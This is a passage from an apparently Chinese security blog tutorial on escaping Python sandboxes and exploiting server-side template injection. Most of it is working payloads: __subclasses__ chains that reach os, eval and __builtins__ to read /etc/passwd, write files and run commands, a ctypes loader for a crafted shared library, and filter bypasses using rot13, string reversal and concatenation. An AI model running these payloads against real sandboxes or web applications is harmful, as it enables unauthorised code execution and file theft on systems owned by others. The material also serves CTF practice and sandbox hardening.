(<span class="hljs-number">76</span>, &lt;type &#x27;_sre.SRE_Scanner&#x27;&gt;)
(<span class="hljs-number">77</span>, &lt;class &#x27;site.Quitter&#x27;&gt;)
(<span class="hljs-number">78</span>, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;)
(<span class="hljs-number">79</span>, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;)
(<span class="hljs-number">80</span>, &lt;type &#x27;operator.itemgetter&#x27;&gt;)
(<span class="hljs-number">81</span>, &lt;type &#x27;operator.attrgetter&#x27;&gt;)
(<span class="hljs-number">82</span>, &lt;type &#x27;operator.methodcaller&#x27;&gt;)
(<span class="hljs-number">83</span>, &lt;type &#x27;functools.partial&#x27;&gt;)
(<span class="hljs-number">84</span>, &lt;type &#x27;MultibyteCodec&#x27;&gt;)
(<span class="hljs-number">85</span>, &lt;type &#x27;MultibyteIncrementalEncoder&#x27;&gt;)
(<span class="hljs-number">86</span>, &lt;type &#x27;MultibyteIncrementalDecoder&#x27;&gt;)
(<span class="hljs-number">87</span>, &lt;type &#x27;MultibyteStreamReader&#x27;&gt;)
(<span class="hljs-number">88</span>, &lt;type &#x27;MultibyteStreamWriter&#x27;&gt;)
</code></pre></div>





<h3 id="文件利用"><a href="#文件利用" class="headerlink" title="文件利用"></a>文件利用</h3><p>文件操作的原理是获取到object后，使用__subclasses__来获取file类，进而进行文件操作。</p>
<h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><div class="hljs code-wrapper"><pre><code class="hljs python">读文件：

<span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()

写文件：

<span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/tmp&#x27;</span>).write(<span class="hljs-string">&#x27;test&#x27;</span>)</code></pre></div>





<p>如果仅仅是沙箱逃逸，读取文件也可考虑</p>
<h4 id="open"><a href="#open" class="headerlink" title="open"></a><strong>open</strong></h4><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()</code></pre></div>

<h4 id="codecs"><a href="#codecs" class="headerlink" title="codecs"></a><strong>codecs</strong></h4><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> codecs
codecs.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).read()</code></pre></div>





<h3 id="命令执行-amp-代码执行"><a href="#命令执行-amp-代码执行" class="headerlink" title="命令执行&amp;代码执行"></a>命令执行&amp;代码执行</h3><ol>
<li><p>找到重载过的__init__类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()):
    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;wrapper&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(i[<span class="hljs-number">1</span>].__init__):
        print(i[<span class="hljs-number">0</span>],i[<span class="hljs-number">1</span>].__init__)</code></pre></div>

<div class="hljs code-wrapper"><pre><code class="hljs reasonml">G:\Program\Python\tools\flask ssti&gt;python27 enumerate_unbound.py
(<span class="hljs-number">59</span>, &lt;unbound <span class="hljs-keyword">method</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WarningMessage</span>.</span><span class="hljs-module"><span class="hljs-identifier">__init__</span>&gt;</span></span>)
(<span class="hljs-number">60</span>, &lt;unbound <span class="hljs-keyword">method</span> catch_warnings.__init__&gt;)
(<span class="hljs-number">61</span>, &lt;unbound <span class="hljs-keyword">method</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_IterationGuard</span>.</span><span class="hljs-module"><span class="hljs-identifier">__init__</span>&gt;</span></span>)
(<span class="hljs-number">62</span>, &lt;unbound <span class="hljs-keyword">method</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WeakSet</span>.</span><span class="hljs-module"><span class="hljs-identifier">__init__</span>&gt;</span></span>)
(<span class="hljs-number">72</span>, &lt;unbound <span class="hljs-keyword">method</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_Printer</span>.</span><span class="hljs-module"><span class="hljs-identifier">__init__</span>&gt;</span></span>)
(<span class="hljs-number">77</span>, &lt;unbound <span class="hljs-keyword">method</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Quitter</span>.</span><span class="hljs-module"><span class="hljs-identifier">__init__</span>&gt;</span></span>)
(<span class="hljs-number">78</span>, &lt;unbound <span class="hljs-keyword">method</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">IncrementalEncoder</span>.</span><span class="hljs-module"><span class="hljs-identifier">__init__</span>&gt;</span></span>)
(<span class="hljs-number">79</span>, &lt;unbound <span class="hljs-keyword">method</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">IncrementalDecoder</span>.</span><span class="hljs-module"><span class="hljs-identifier">__init__</span>&gt;</span></span>)
</code></pre></div>


</li>
<li><p>使用这些库使用<code>__ini__.__gloabals__</code>或者<code>__init__.func_globals</code>、<code>_module</code>访问全局变量，可以使用<code>__dict__.keys()</code>得到可以利用的类，最通常的是linecache，在不导入其他库的情况下，也只有linecache可以包含os。</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.keys()
[<span class="hljs-string">&#x27;filterwarnings&#x27;</span>, <span class="hljs-string">&#x27;once_registry&#x27;</span>, <span class="hljs-string">&#x27;WarningMessage&#x27;</span>, <span class="hljs-string">&#x27;_show_warning&#x27;</span>, <span class="hljs-string">&#x27;filters&#x27;</span>, <span class="hljs-string">&#x27;_setoption&#x27;</span>, <span class="hljs-string">&#x27;showwarning&#x27;</span>, <span class="hljs-string">&#x27;__all__&#x27;</span>, <span class="hljs-string">&#x27;onceregistry&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;simplefilter&#x27;</span>, <span class="hljs-string">&#x27;default_action&#x27;</span>, <span class="hljs-string">&#x27;_getcategory&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;catch_warnings&#x27;</span>, <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-string">&#x27;warnpy3k&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;warn_explicit&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;warn&#x27;</span>, <span class="hljs-string">&#x27;_processoptions&#x27;</span>, <span class="hljs-string">&#x27;defaultaction&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;_OptionError&#x27;</span>, <span class="hljs-string">&#x27;resetwarnings&#x27;</span>, <span class="hljs-string">&#x27;formatwarning&#x27;</span>, <span class="hljs-string">&#x27;_getaction&#x27;</span>]
<span class="hljs-meta">&gt;&gt;&gt; </span></code></pre></div>

<div class="hljs code-wrapper"><pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div>

<div class="hljs code-wrapper"><pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>]()._module.linecache.os.system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div>


</li>
<li><p>再进一步使用<code>__dict__</code>找到os。</p>
</li>
</ol>
<blockquote>
<ol>
<li>找到os库<ol>
<li>使用<code>__ini__.__gloabals__</code>或者<code>__init__.func_globals</code>访问全局变量，即可找到包含os的其他库，再进一步使用<code>__dict__</code>找到os</li>
<li>然后利用os.system、os.popen</li>
</ol>
</li>
<li>找到sys库</li>
<li>找到__builtins__后利用eval执行命令<ol>
<li>eval(‘__import__(“os”).system(“ls”)’)</li>
</ol>
</li>
</ol>
</blockquote>
<h4 id="找到os-sys-builtins-的思路："><a href="#找到os-sys-builtins-的思路：" class="headerlink" title="找到os/sys/__builtins__的思路："></a>找到os/sys/<code>__builtins__</code>的思路：</h4><p>python中<code>[].__class__.__base__.__subclasses__()</code>引入了很多模块，这些模块中很多都引入了os，如这里的第59号，warning模块。</p>
<p>python2中可以使用如下脚本来寻找包含os的模块</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">num = <span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">in</span> item.__init__.__globals__:
            print(num,item)
        num+=<span class="hljs-number">1</span>
    <span class="hljs-keyword">except</span>:
        num+=<span class="hljs-number">1</span></code></pre></div>

<div class="hljs code-wrapper"><pre><code class="hljs sh">G:\Program\Python\tools\flask ssti&gt;python27 find_os.py
(72, &lt;class <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;)
(77, &lt;class <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;)
</code></pre></div>

<p>这里就可以直接使用</p>
<p><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[72].__init__.globals__[&#39;os&#39;]</code>引入os模块</p>
<p>使用<code>__ini__.__gloabals__</code>或者<code>__init__.func_globals</code>可以反问到当前的全局变量，全局变量中就包含了这些包含的库，使用keys()函数可以更加方便看到有哪些库可以使用</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.keys()
[<span class="hljs-string">&#x27;filterwarnings&#x27;</span>, <span class="hljs-string">&#x27;once_registry&#x27;</span>, <span class="hljs-string">&#x27;WarningMessage&#x27;</span>, <span class="hljs-string">&#x27;_show_warning&#x27;</span>, <span class="hljs-string">&#x27;filters&#x27;</span>, <span class="hljs-string">&#x27;_setoption&#x27;</span>, <span class="hljs-string">&#x27;showwarning&#x27;</span>, <span class="hljs-string">&#x27;__all__&#x27;</span>, <span class="hljs-string">&#x27;onceregistry&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;simplefilter&#x27;</span>, <span class="hljs-string">&#x27;default_action&#x27;</span>, <span class="hljs-string">&#x27;_getcategory&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;catch_warnings&#x27;</span>, <span class="hljs-string">&#x27;__file__&#x27;</span>, <span class="hljs-string">&#x27;warnpy3k&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;warn_explicit&#x27;</span>, <span class="hljs-string">&#x27;types&#x27;</span>, <span class="hljs-string">&#x27;warn&#x27;</span>, <span class="hljs-string">&#x27;_processoptions&#x27;</span>, <span class="hljs-string">&#x27;defaultaction&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;linecache&#x27;</span>, <span class="hljs-string">&#x27;_OptionError&#x27;</span>, <span class="hljs-string">&#x27;resetwarnings&#x27;</span>, <span class="hljs-string">&#x27;formatwarning&#x27;</span>, <span class="hljs-string">&#x27;_getaction&#x27;</span>]
<span class="hljs-meta">&gt;&gt;&gt; </span></code></pre></div>



<div class="hljs code-wrapper"><pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)
[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__.values()[<span class="hljs-number">12</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div>



<p>也可以不包含<code>__global__</code></p>
<div class="hljs code-wrapper"><pre><code class="hljs python">[].__class__.__base__.__subclasses__()[<span class="hljs-number">59</span>]()._module.linecache.os.system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div>





<h4 id="os利用方法"><a href="#os利用方法" class="headerlink" title="os利用方法"></a>os利用方法</h4><p>找到linecache或者其他包含os库的类后即可调用<code>__dict__</code>获取os，然后执行system</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div>

<div class="hljs code-wrapper"><pre><code class="hljs python">[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()</code></pre></div>



<h4 id="eval利用方法"><a href="#eval利用方法" class="headerlink" title="eval利用方法"></a>eval利用方法</h4><p>eval的使用方法：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;ipconfig&quot;)&#x27;</span>)</code></pre></div>

<p>但是具体在沙箱逃逸和ssti的场景下，需要进行更多的变换</p>
<h4 id="builtins-利用方法"><a href="#builtins-利用方法" class="headerlink" title="__builtins__利用方法"></a><code>__builtins__</code>利用方法</h4><p><code>__builtins__</code> 下有eval可以利用，也可以使用<code>__import__</code>来引入os。</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">[].__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__下有<span class="hljs-built_in">eval</span>，<span class="hljs-built_in">__import__</span>等的全局函数，可以利用此来执行命令：
[].__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)
[].__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)
[].__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()
[].__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()</code></pre></div>





<h4 id="exec利用方法"><a href="#exec利用方法" class="headerlink" title="exec利用方法"></a>exec利用方法</h4><p>exec的使用方法：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">exec(<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;ipconfig&quot;)&#x27;</span>)</code></pre></div>



<h4 id="timeit-利用方法"><a href="#timeit-利用方法" class="headerlink" title="timeit 利用方法"></a>timeit 利用方法</h4><p><strong>timeit</strong> 本是检测性能的，也可以任意代码执行</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> timeit
timeit.timeit(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ipconfig&#x27;)&quot;</span>,number=<span class="hljs-number">1</span>)</code></pre></div>



<h4 id="platform利用方法"><a href="#platform利用方法" class="headerlink" title="platform利用方法"></a>platform利用方法</h4><p><strong>platform</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs delphi">import <span class="hljs-keyword">platform</span>
<span class="hljs-keyword">platform</span>.popen(<span class="hljs-string">&#x27;ipconfig&#x27;</span>).<span class="hljs-keyword">read</span>()</code></pre></div>



<h4 id="subprocess利用方法"><a href="#subprocess利用方法" class="headerlink" title="subprocess利用方法"></a>subprocess利用方法</h4><p><strong>subprocess</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs reasonml">import subprocess
subprocess.<span class="hljs-constructor">Popen(&#x27;<span class="hljs-params">ipconfig</span>&#x27;, <span class="hljs-params">shell</span>=True, <span class="hljs-params">stdout</span>=<span class="hljs-params">subprocess</span>.PIPE,<span class="hljs-params">stderr</span>=<span class="hljs-params">subprocess</span>.STDOUT)</span>.stdout.read<span class="hljs-literal">()</span></code></pre></div>





<h3 id="zipimport-命令执行方法"><a href="#zipimport-命令执行方法" class="headerlink" title="zipimport 命令执行方法"></a>zipimport 命令执行方法</h3><h3 id="构造so库"><a href="#构造so库" class="headerlink" title="构造so库"></a>构造so库</h3><p>在().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()中发现有可用的类</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;
&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">ctypes</span>.<span class="hljs-title">CDLL</span>&#x27;&gt;</span>
<span class="hljs-class">&lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">ctypes</span>.<span class="hljs-title">LibraryLoader</span>&#x27;&gt;</span></code></pre></div>

<p>构造一个so库，列一下/home/ctf/下的文件</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;  </span>
void my_init(void) __attribute__((constructor)); 
void my_init(void)  
&#123;  
    system(<span class="hljs-string">&quot;ls -la /home/ctf/ &gt; /tmp/ls_home_ctf&quot;</span>);
&#125;</code></pre></div>

<p>将编译好的so直接二进制写入/tmp/bk.so<br>使用ctypes加载so</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">86</span>](().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">85</span>]).LoadLibrary(<span class="hljs-string">&#x27;/tmp/bk.so&#x27;</span>)</code></pre></div>





<h3 id="f修饰符"><a href="#f修饰符" class="headerlink" title="f修饰符"></a>f修饰符</h3><p>在PEP 498中引入了新的字符串类型修饰符：f或F，用f修饰的字符串将可以执行代码。可以参考此文档 <a target="_blank" rel="noopener" href="https://www.python.org/dev/peps/pep-0498/">https://www.python.org/dev/peps/pep-0498/</a></p>
<p>只有在python3.6.0+的版本才有这个方法。简单来说，可以理解为字符串外层套了一个exec()</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Smi1e&quot;</span>)&#125;</span>&#x27;</span>
Smi1e
<span class="hljs-string">&#x27;None&#x27;</span>
<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;dir&quot;</span>)&#125;</span>&#x27;</span>
 驱动器 C 中的卷是 Windows
.....</code></pre></div>

<p>这个有点类似于php中的<code>&lt;?php &quot;$&#123;@phpinfo()&#125;&quot;; ?&gt;</code>，但python中没有将普通字符串转成f字符串的方法，所以实际使用时效果不明。</p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h2 id="0x03-常见payload"><a href="#0x03-常见payload" class="headerlink" title="0x03 常见payload"></a>0x03 常见payload</h2><h3 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h3><p>包包哥的python2 payload</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 利用file()函数读取文件：（写类似）</span>
().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;./test.py&#x27;</span>).read()
<span class="hljs-comment"># 执行系统命令：</span>
().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals[<span class="hljs-string">&#x27;linecache&#x27;</span>].os.system(<span class="hljs-string">&#x27;ls&#x27;</span>)
<span class="hljs-comment"># 执行系统命令：</span>
().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.values()[<span class="hljs-number">13</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)
<span class="hljs-comment"># 重新载入__builtins__：</span>
().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>]()._module.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;ls&quot;</span>)
<span class="hljs-comment">#读文件</span>
().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">r&#x27;C:\1.php&#x27;</span>).read()

<span class="hljs-comment">#写文件</span>
().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;/var/www/html/input&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;123&#x27;</span>)

<span class="hljs-comment">#执行任意命令</span>
().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.values()[<span class="hljs-number">13</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )

<span class="hljs-comment"># 利用 __getattibute__ 方法</span>

x = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-keyword">if</span> x.__name__ == <span class="hljs-string">&#x27;ca&#x27;</span>+<span class="hljs-string">&#x27;tch_warnings&#x27;</span>][<span class="hljs-number">0</span>].__init__
x.__getattribute__(<span class="hljs-string">&quot;func_global&quot;</span>+<span class="hljs-string">&quot;s&quot;</span>)[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>].__dict__[<span class="hljs-string">&#x27;sy&#x27;</span>+<span class="hljs-string">&#x27;stem&#x27;</span>](<span class="hljs-string">&#x27;l&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)</code></pre></div>

<p>n3k0大哥的python3 payload</p>
<h3 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h3><p><strong>python3各个小版本之间有区别，有的payload可以用于py3.7 有的可以用于py3.5</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs python">().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[-<span class="hljs-number">4</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;ls&#x27;</span>)

().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">93</span>].__init__.__globals__[<span class="hljs-string">&quot;sys&quot;</span>].modules[<span class="hljs-string">&quot;os&quot;</span>].system(<span class="hljs-string">&quot;ls&quot;</span>)

<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">104</span>].__init__.__globals__[<span class="hljs-string">&quot;sys&quot;</span>].modules[<span class="hljs-string">&quot;os&quot;</span>].system(<span class="hljs-string">&quot;ls&quot;</span>)

[].__class__.__base__.__subclasses__()[<span class="hljs-number">127</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div>

<h1 id="逃逸绕过方法"><a href="#逃逸绕过方法" class="headerlink" title="逃逸绕过方法"></a><strong>逃逸绕过方法</strong></h1><h2 id="0x01-花式import-amp-import-混淆"><a href="#0x01-花式import-amp-import-混淆" class="headerlink" title="0x01 花式import&amp;import 混淆"></a>0x01 花式import&amp;import 混淆</h2><p>首先，禁用 <code>import os</code> 肯定是不行的，因为</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span>  os
<span class="hljs-keyword">import</span>   os
<span class="hljs-keyword">import</span>    os
...</code></pre></div>

<p>都可以。如果多个空格也过滤了，Python 能够 import 的可不止 <code>import</code>，还有 <code>__import__</code>：<code>__import__(&#39;os&#39;)</code>，<code>__import__</code>被干了还有 <code>importlib</code>：<code>importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code></p>
<p>这样就安全了吗？实际上<code>import</code>可以通过其他方式完成。回想一下 import 的原理，本质上就是执行一遍导入的库。这个过程实际上可以用 <code>execfile</code> 来代替：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">execfile(<span class="hljs-string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)
system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div>

<p>不过要注意，2.x 才能用，3.x 删了 execfile，不过可以这样：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:
    exec(f.read())
system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div>

<p>这个方法倒是 2.x、3.x 通用的。</p>
<p>不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下，：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys
print(sys.path)</code></pre></div>





<p>比如通过正则匹配之类的，拒绝<code>import os</code>、<code>import commands</code>之类的语句出现</p>
<p>这是最低级的一种防御措施，可以通过一些编码来进行混淆</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">f3ck = <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;pbzznaqf&quot;</span>.decode(<span class="hljs-string">&#x27;rot_13&#x27;</span>))
<span class="hljs-built_in">print</span> f3ck.getoutput(<span class="hljs-string">&#x27;ifconfig&#x27;</span>)</code></pre></div>

<p>或者配合<code>getattr</code>函数</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> codecs
<span class="hljs-built_in">getattr</span>(os,codecs.encode(<span class="hljs-string">&quot;flfgrz&quot;</span>,<span class="hljs-string">&#x27;rot13&#x27;</span>))(<span class="hljs-string">&#x27;ifconfig&#x27;</span>)</code></pre></div>





<h2 id="0x02-花式处理字符串"><a href="#0x02-花式处理字符串" class="headerlink" title="0x02 花式处理字符串"></a>0x02 花式处理字符串</h2><p>代码中要是出现 <code>os</code>，直接不让运行。那么可以利用字符串的各种变化来引入 os：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;so&#x27;</span>[::-<span class="hljs-number">1</span>]).system(<span class="hljs-string">&#x27;ls&#x27;</span>)
b = <span class="hljs-string">&#x27;o&#x27;</span>
a = <span class="hljs-string">&#x27;s&#x27;</span>
<span class="hljs-built_in">__import__</span>(a+b).system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre></div>

<p>还可以利用 <code>eval</code> 或者 <code>exec</code>：</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="hljs-number">1</span>])
macr0phag3
<span class="hljs-number">0</span>
<span class="hljs-meta">&gt;&gt;&gt; </span>exec(<span class="hljs-string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="hljs-number">1</span>])
macr0phag3</code></pre></div>

<p>顺便说一下，eval、exec 都是相当危险的函数，exec 比 eval 还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、变量拼接、base64、hex、rot13…等等，太多了。。。</p>
